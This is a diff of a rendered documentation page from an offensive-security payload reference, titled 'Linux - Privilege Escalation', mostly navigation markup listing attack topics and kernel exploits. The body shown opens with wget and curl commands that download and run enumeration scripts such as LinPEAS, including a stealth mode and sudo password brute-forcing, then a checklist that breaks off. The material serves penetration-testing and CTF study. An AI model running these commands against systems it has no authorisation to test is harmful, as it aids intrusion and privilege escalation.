+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_39" type="checkbox" id="__nav_39" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_39">
+          Server Side Template Injection
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Server Side Template Injection" data-md-level="1">
+        <label class="md-nav__title" for="__nav_39">
+          <span class="md-nav__icon md-icon"></span>
+          Server Side Template Injection
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Server%20Side%20Template%20Injection/" class="md-nav__link">
+        Templates Injections
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_40" type="checkbox" id="__nav_40" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_40">
+          Tabnabbing
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Tabnabbing" data-md-level="1">
+        <label class="md-nav__title" for="__nav_40">
+          <span class="md-nav__icon md-icon"></span>
+          Tabnabbing
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Tabnabbing/" class="md-nav__link">
+        Tabnabbing
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_41" type="checkbox" id="__nav_41" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_41">
+          Type Juggling
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Type Juggling" data-md-level="1">
+        <label class="md-nav__title" for="__nav_41">
+          <span class="md-nav__icon md-icon"></span>
+          Type Juggling
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Type%20Juggling/" class="md-nav__link">
+        PHP Juggling type and magic hashes
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_42" type="checkbox" id="__nav_42" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_42">
+          Upload Insecure Files
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Upload Insecure Files" data-md-level="1">
+        <label class="md-nav__title" for="__nav_42">
+          <span class="md-nav__icon md-icon"></span>
+          Upload Insecure Files
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Upload%20Insecure%20Files/" class="md-nav__link">
+        Upload
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_42_2" type="checkbox" id="__nav_42_2" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_42_2">
+          CVE Ffmpeg HLS
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="CVE Ffmpeg HLS" data-md-level="2">
+        <label class="md-nav__title" for="__nav_42_2">
+          <span class="md-nav__icon md-icon"></span>
+          CVE Ffmpeg HLS
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Upload%20Insecure%20Files/CVE%20Ffmpeg%20HLS/" class="md-nav__link">
+        FFmpeg HLS vulnerability
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_42_3" type="checkbox" id="__nav_42_3" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_42_3">
+          Configuration Apache .htaccess
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Configuration Apache .htaccess" data-md-level="2">
+        <label class="md-nav__title" for="__nav_42_3">
+          <span class="md-nav__icon md-icon"></span>
+          Configuration Apache .htaccess
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Upload%20Insecure%20Files/Configuration%20Apache%20.htaccess/" class="md-nav__link">
+        .htaccess upload
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_42_4" type="checkbox" id="__nav_42_4" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_42_4">
+          Configuration Busybox httpd.conf
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Configuration Busybox httpd.conf" data-md-level="2">
+        <label class="md-nav__title" for="__nav_42_4">
+          <span class="md-nav__icon md-icon"></span>
+          Configuration Busybox httpd.conf
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Upload%20Insecure%20Files/Configuration%20Busybox%20httpd.conf/" class="md-nav__link">
+        Index
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_42_5" type="checkbox" id="__nav_42_5" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_42_5">
+          Extension Flash
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Extension Flash" data-md-level="2">
+        <label class="md-nav__title" for="__nav_42_5">
+          <span class="md-nav__icon md-icon"></span>
+          Extension Flash
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Upload%20Insecure%20Files/Extension%20Flash/" class="md-nav__link">
+        Index
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_42_6" type="checkbox" id="__nav_42_6" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_42_6">
+          Picture Image Magik
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Picture Image Magik" data-md-level="2">
+        <label class="md-nav__title" for="__nav_42_6">
+          <span class="md-nav__icon md-icon"></span>
+          Picture Image Magik
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Upload%20Insecure%20Files/Picture%20Image%20Magik/" class="md-nav__link">
+        Image Tragik 1 & 2
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_42_7" type="checkbox" id="__nav_42_7" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_42_7">
+          Zip Slip
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Zip Slip" data-md-level="2">
+        <label class="md-nav__title" for="__nav_42_7">
+          <span class="md-nav__icon md-icon"></span>
+          Zip Slip
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Upload%20Insecure%20Files/Zip%20Slip/" class="md-nav__link">
+        Zip Slip
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_43" type="checkbox" id="__nav_43" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_43">
+          Web Cache Deception
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Web Cache Deception" data-md-level="1">
+        <label class="md-nav__title" for="__nav_43">
+          <span class="md-nav__icon md-icon"></span>
+          Web Cache Deception
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Web%20Cache%20Deception/" class="md-nav__link">
+        Web Cache Deception Attack
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_44" type="checkbox" id="__nav_44" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_44">
+          Web Sockets
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Web Sockets" data-md-level="1">
+        <label class="md-nav__title" for="__nav_44">
+          <span class="md-nav__icon md-icon"></span>
+          Web Sockets
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Web%20Sockets/" class="md-nav__link">
+        Web Sockets Attacks
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_45" type="checkbox" id="__nav_45" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_45">
+          XPATH Injection
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="XPATH Injection" data-md-level="1">
+        <label class="md-nav__title" for="__nav_45">
+          <span class="md-nav__icon md-icon"></span>
+          XPATH Injection
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../XPATH%20Injection/" class="md-nav__link">
+        XPATH injection
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_46" type="checkbox" id="__nav_46" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_46">
+          XSLT Injection
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="XSLT Injection" data-md-level="1">
+        <label class="md-nav__title" for="__nav_46">
+          <span class="md-nav__icon md-icon"></span>
+          XSLT Injection
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../XSLT%20Injection/" class="md-nav__link">
+        XSLT Injection
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_47" type="checkbox" id="__nav_47" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_47">
+          XSS Injection
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="XSS Injection" data-md-level="1">
+        <label class="md-nav__title" for="__nav_47">
+          <span class="md-nav__icon md-icon"></span>
+          XSS Injection
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../XSS%20Injection/" class="md-nav__link">
+        Cross Site Scripting
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../XSS%20Injection/XSS%20in%20Angular/" class="md-nav__link">
+        XSS in Angular and AngularJS
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../XSS%20Injection/XSS%20with%20Relative%20Path%20Overwrite/" class="md-nav__link">
+        XSS with Relative Path Overwrite - IE 8/9 and lower
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_48" type="checkbox" id="__nav_48" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_48">
+          XXE Injection
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="XXE Injection" data-md-level="1">
+        <label class="md-nav__title" for="__nav_48">
+          <span class="md-nav__icon md-icon"></span>
+          XXE Injection
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../XXE%20Injection/" class="md-nav__link">
+        XML External Entity
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_49" type="checkbox" id="__nav_49" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_49">
+           template vuln
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label=" template vuln" data-md-level="1">
+        <label class="md-nav__title" for="__nav_49">
+          <span class="md-nav__icon md-icon"></span>
+           template vuln
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../_template_vuln/" class="md-nav__link">
+        Vulnerability Title
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#summary" class="md-nav__link">
+    Summary
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#tools" class="md-nav__link">
+    Tools
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#checklists" class="md-nav__link">
+    Checklists
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#looting-for-passwords" class="md-nav__link">
+    Looting for passwords
+  </a>
+  
+    <nav class="md-nav" aria-label="Looting for passwords">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#files-containing-passwords" class="md-nav__link">
+    Files containing passwords
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#old-passwords-in-etcsecurityopasswd" class="md-nav__link">
+    Old passwords in /etc/security/opasswd
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#last-edited-files" class="md-nav__link">
+    Last edited files
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#in-memory-passwords" class="md-nav__link">
+    In memory passwords
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#find-sensitive-files" class="md-nav__link">
+    Find sensitive files
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#ssh-key" class="md-nav__link">
+    SSH Key
+  </a>
+  
+    <nav class="md-nav" aria-label="SSH Key">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#sensitive-files" class="md-nav__link">
+    Sensitive files
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#ssh-key-predictable-prng-authorized_keys-process" class="md-nav__link">
+    SSH Key Predictable PRNG (Authorized_Keys) Process
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#scheduled-tasks" class="md-nav__link">
+    Scheduled tasks
+  </a>
+  
+    <nav class="md-nav" aria-label="Scheduled tasks">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#cron-jobs" class="md-nav__link">
+    Cron jobs
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#systemd-timers" class="md-nav__link">
+    Systemd timers
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#suid" class="md-nav__link">
+    SUID
+  </a>
+  
+    <nav class="md-nav" aria-label="SUID">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#find-suid-binaries" class="md-nav__link">
+    Find SUID binaries
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#create-a-suid-binary" class="md-nav__link">
+    Create a SUID binary
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#capabilities" class="md-nav__link">
+    Capabilities
+  </a>
+  
+    <nav class="md-nav" aria-label="Capabilities">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#list-capabilities-of-binaries" class="md-nav__link">
+    List capabilities of binaries
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#edit-capabilities" class="md-nav__link">
+    Edit capabilities
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#interesting-capabilities" class="md-nav__link">
+    Interesting capabilities
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#sudo" class="md-nav__link">
+    SUDO
+  </a>
+  
+    <nav class="md-nav" aria-label="SUDO">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#nopasswd" class="md-nav__link">
+    NOPASSWD
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#ld_preload-and-nopasswd" class="md-nav__link">
+    LD_PRELOAD and NOPASSWD
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#doas" class="md-nav__link">
+    Doas
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#sudo_inject" class="md-nav__link">
+    sudo_inject
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#cve-2019-14287" class="md-nav__link">
+    CVE-2019-14287
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#gtfobins" class="md-nav__link">
+    GTFOBins
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#wildcard" class="md-nav__link">
+    Wildcard
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#writable-files" class="md-nav__link">
+    Writable files
+  </a>
+  
+    <nav class="md-nav" aria-label="Writable files">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#writable-etcsysconfignetwork-scripts-centosredhat" class="md-nav__link">
+    Writable /etc/sysconfig/network-scripts/ (Centos/Redhat)
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#writable-etcpasswd" class="md-nav__link">
+    Writable /etc/passwd
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#writable-etcsudoers" class="md-nav__link">
+    Writable /etc/sudoers
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#nfs-root-squashing" class="md-nav__link">
+    NFS Root Squashing
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#shared-library" class="md-nav__link">
+    Shared Library
+  </a>
+  
+    <nav class="md-nav" aria-label="Shared Library">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#ldconfig" class="md-nav__link">
+    ldconfig
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#rpath" class="md-nav__link">
+    RPATH
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#groups" class="md-nav__link">
+    Groups
+  </a>
+  
+    <nav class="md-nav" aria-label="Groups">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#docker" class="md-nav__link">
+    Docker
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#lxclxd" class="md-nav__link">
+    LXC/LXD
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#hijack-tmux-session" class="md-nav__link">
+    Hijack TMUX session
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#kernel-exploits" class="md-nav__link">
+    Kernel Exploits
+  </a>
+  
+    <nav class="md-nav" aria-label="Kernel Exploits">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#cve-2022-0847-dirtypipe" class="md-nav__link">
+    CVE-2022-0847 (DirtyPipe)
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#cve-2016-5195-dirtycow" class="md-nav__link">
+    CVE-2016-5195 (DirtyCow)
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#cve-2010-3904-rds" class="md-nav__link">
+    CVE-2010-3904 (RDS)
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#cve-2010-4258-full-nelson" class="md-nav__link">
+    CVE-2010-4258 (Full Nelson)
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#cve-2012-0056-mempodipper" class="md-nav__link">
+    CVE-2012-0056 (Mempodipper)
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#references" class="md-nav__link">
+    References
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          <div class="md-content" data-md-component="content">
+            <article class="md-content__inner md-typeset">
+              
+                
+
+  <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/edit/master/Methodology and Resources/Linux - Privilege Escalation.md" title="Edit this page" class="md-content__button md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20.71 7.04c.39-.39.39-1.04 0-1.41l-2.34-2.34c-.37-.39-1.02-.39-1.41 0l-1.84 1.83 3.75 3.75M3 17.25V21h3.75L17.81 9.93l-3.75-3.75L3 17.25Z"/></svg>
+  </a>
+
+
+<h1 id="linux-privilege-escalation">Linux - Privilege Escalation</h1>
+<h2 id="summary">Summary</h2>
+<ul>
+<li><a href="#tools">Tools</a></li>
+<li><a href="#checklists">Checklist</a></li>
+<li><a href="#looting-for-passwords">Looting for passwords</a><ul>
+<li><a href="#files-containing-passwords">Files containing passwords</a></li>
+<li><a href="#old-passwords-in-etcsecurityopasswd">Old passwords in /etc/security/opasswd</a></li>
+<li><a href="#last-edited-files">Last edited files</a></li>
+<li><a href="#in-memory-passwords">In memory passwords</a></li>
+<li><a href="#find-sensitive-files">Find sensitive files</a></li>
+</ul>
+</li>
+<li><a href="#ssh-key">SSH Key</a><ul>
+<li><a href="#sensitive-files">Sensitive files</a></li>
+<li><a href="#ssh-key-predictable-prng-authorized_keys-process">SSH Key Predictable PRNG (Authorized_Keys) Process</a></li>
+</ul>
+</li>
+<li><a href="#scheduled-tasks">Scheduled tasks</a><ul>
+<li><a href="#cron-jobs">Cron jobs</a></li>
+<li><a href="#systemd-timers">Systemd timers</a></li>
+</ul>
+</li>
+<li><a href="#suid">SUID</a><ul>
+<li><a href="#find-suid-binaries">Find SUID binaries</a></li>
+<li><a href="#create-a-suid-binary">Create a SUID binary</a></li>
+</ul>
+</li>
+<li><a href="#capabilities">Capabilities</a><ul>
+<li><a href="#list-capabilities-of-binaries">List capabilities of binaries</a></li>
+<li><a href="#edit-capabilities">Edit capabilities</a></li>
+<li><a href="#interesting-capabilities">Interesting capabilities</a></li>
+</ul>
+</li>
+<li><a href="#sudo">SUDO</a><ul>
+<li><a href="#nopasswd">NOPASSWD</a></li>
+<li><a href="#ld_preload-and-nopasswd">LD_PRELOAD and NOPASSWD</a></li>
+<li><a href="#doas">Doas</a></li>
+<li><a href="#sudo_inject">sudo_inject</a></li>
+<li><a href="#cve-2019-14287">CVE-2019-14287</a></li>
+</ul>
+</li>
+<li><a href="#gtfobins">GTFOBins</a></li>
+<li><a href="#wildcard">Wildcard</a></li>
+<li><a href="#writable-files">Writable files</a><ul>
+<li><a href="#writable-etcpasswd">Writable /etc/passwd</a></li>
+<li><a href="#writable-etcsudoers">Writable /etc/sudoers</a></li>
+</ul>
+</li>
+<li><a href="#nfs-root-squashing">NFS Root Squashing</a></li>
+<li><a href="#shared-library">Shared Library</a><ul>
+<li><a href="#ldconfig">ldconfig</a></li>
+<li><a href="#rpath">RPATH</a></li>
+</ul>
+</li>
+<li><a href="#groups">Groups</a><ul>
+<li><a href="#docker">Docker</a></li>
+<li><a href="#lxclxd">LXC/LXD</a></li>
+</ul>
+</li>
+<li><a href="#hijack-tmux-session">Hijack TMUX session</a></li>
+<li><a href="#kernel-exploits">Kernel Exploits</a><ul>
+<li><a href="#cve-2022-0847-dirtypipe">CVE-2022-0847 (DirtyPipe)</a> </li>
+<li><a href="#cve-2016-5195-dirtycow">CVE-2016-5195 (DirtyCow)</a></li>
+<li><a href="#cve-2010-3904-rds">CVE-2010-3904 (RDS)</a></li>
+<li><a href="#cve-2010-4258-full-nelson">CVE-2010-4258 (Full Nelson)</a></li>
+<li><a href="#cve-2012-0056-mempodipper">CVE-2012-0056 (Mempodipper)</a></li>
+</ul>
+</li>
+</ul>
+<h2 id="tools">Tools</h2>
+<p>There are many scripts that you can execute on a linux machine which automatically enumerate sytem information, processes, and files to locate privilege escelation vectors.
+Here are a few:</p>
+<ul>
+<li>
+<p><a href="https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS">LinPEAS - Linux Privilege Escalation Awesome Script</a></p>
+<p><code>powershell
+wget "https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh" -O linpeas.sh
+curl "https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh" -o linpeas.sh
+./linpeas.sh -a #all checks - deeper system enumeration, but it takes longer to complete.
+./linpeas.sh -s #superfast &amp; stealth - This will bypass some time consuming checks. In stealth mode Nothing will be written to the disk.
+./linpeas.sh -P #Password - Pass a password that will be used with sudo -l and bruteforcing other users</code></p>
+</li>
+<li>
+<p><a href="https://github.com/diego-treitos/linux-smart-enumeration">LinuxSmartEnumeration - Linux enumeration tools for pentesting and CTFs</a></p>
+<p><code>powershell
+wget "https://raw.githubusercontent.com/diego-treitos/linux-smart-enumeration/master/lse.sh" -O lse.sh
+curl "https://raw.githubusercontent.com/diego-treitos/linux-smart-enumeration/master/lse.sh" -o lse.sh
+./lse.sh -l1 # shows interesting information that should help you to privesc
+./lse.sh -l2 # dump all the information it gathers about the system</code></p>
+</li>
+<li>
+<p><a href="https://github.com/rebootuser/LinEnum">LinEnum - Scripted Local Linux Enumeration &amp; Privilege Escalation Checks</a></p>
+<p><code>powershell
+./LinEnum.sh -s -k keyword -r report -e /tmp/ -t</code></p>
+</li>
+<li>
+<p><a href="https://github.com/AlessandroZ/BeRoot">BeRoot - Privilege Escalation Project - Windows / Linux / Mac</a></p>
+</li>
+<li><a href="https://github.com/sleventyeleven/linuxprivchecker">linuxprivchecker.py - a Linux Privilege Escalation Check Script</a></li>
+<li><a href="https://github.com/pentestmonkey/unix-privesc-check">unix-privesc-check - Automatically exported from code.google.com/p/unix-privesc-check</a></li>
+<li><a href="https://github.com/TH3xACE/SUDO_KILLER">Privilege Escalation through sudo - Linux</a></li>
+</ul>
+<h2 id="checklists">Checklists</h2>
+<ul>
+<li>Kernel and distribution release details</li>
+<li>System Information:</li>
+<li>Hostname</li>
+<li>Networking details:</li>
+<li>Current IP</li>
+<li>Default route details</li>
+<li>DNS server information</li>
+<li>User Information:</li>
+<li>Current user details</li>
+<li>Last logged on users</li>
+<li>Shows users logged onto the host</li>
+<li>List all users including uid/gid information</li>
+<li>List root accounts</li>
+<li>Extracts password policies and hash storage method information</li>
+<li>Checks umask value</li>
